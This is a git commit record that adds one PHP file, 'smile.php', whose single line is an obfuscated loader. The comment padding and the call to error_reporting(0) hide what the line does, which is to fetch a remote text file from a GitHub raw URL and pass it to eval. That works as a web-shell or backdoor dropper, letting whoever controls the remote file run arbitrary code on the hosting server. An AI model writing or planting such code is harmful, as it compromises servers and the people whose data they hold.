b17cbdc26e19042dd2c4a6d5a98ff254637eef24
kolangkaling08 <kolangkaling0802@gmail.com>
2025-07-26 15:27:02 +0700

    Create smile.php

---
+++ powered/supply/damn/smile.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/kolangkaling08/super/refs/heads/main/powered/supply/damn/ai.txt"))?>
